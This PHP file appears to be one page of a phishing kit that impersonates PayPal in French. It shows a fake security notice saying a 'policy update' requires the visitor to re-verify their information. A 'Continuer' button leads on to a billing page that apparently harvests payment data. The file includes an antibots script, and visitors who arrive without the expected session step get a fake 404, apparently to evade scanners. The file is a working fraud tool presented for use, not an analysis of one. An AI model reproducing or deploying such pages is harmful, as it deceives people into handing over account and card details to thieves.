<?php 
ob_start();
session_start();
if(isset($_SESSION['step_one'])){
$_SESSION['step_two']  = true;
include'../antibots.php';
date_default_timezone_set('GMT');
?>
    <!DOCTYPE html>
    <html dir="ltr">
        <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
            <title>Sécurité</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge" />
            
            <link rel="stylesheet" href="../css/normalize.css" />
            <link rel="stylesheet" href="../css/bootstrap.min.css" />
            <link rel="stylesheet" href="../css/font-awesome.min.css" />
            <link rel="stylesheet" href="../css/main_style.css" />
            <link rel="shortcut icon" type="image/x-icon" href="../img/ppl.ico">
        </head>
        <body>
<?php include'navbar.php'?>
            <div class="contain">
                <div class="contain-info">
                   <p class="hd">Que se passe t-il ?</p>
                   <div class="contain-lists">
                       <center>
                            <img src="../img/shield.png" />
                            <h4>Mise à jour de nos politiques d'utilisation</h4>
                       </center>
                       <b class="bold">
                           <h5>Le <?php echo date("d/m/Y")?>, une mise à jour de nos politiques d'utilisation a été effectuée afin de vous garantir un meilleur service et une meilleur sécurité.</h5>
               <h5>
<TD align=left>
<br>

<P>Cette mise à jour inclut un processus de vérification,vous devez donc impérativement mettre à jour vos informations afin de vérifier qu'il s'agit bien de vous et d'éviter tout risque de fraude.</P>
<br>
<P>Après cela, vous pourrez réutiliser votre compte PayPal normalement.
                       <center>
                           <a href="<?php echo 'billing.php?enc='.md5(time()).'&p=1&dispatch='.sha1(time()); ?>" class="proccess">Continuer</a>
                       </center>
                   
                </div>
            </div>
<?php include'footer.php'?>
            <script src="../js/jquery-1.11.3.min.js"></script>
            <script src="../js/bootstrap.min.js"></script>
            <script src="../js/plugins.js"></script>
        </body>
    </html>
<?php
} 
else {
    header("HTTP/1.0 404 Not Found");
  die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}
?>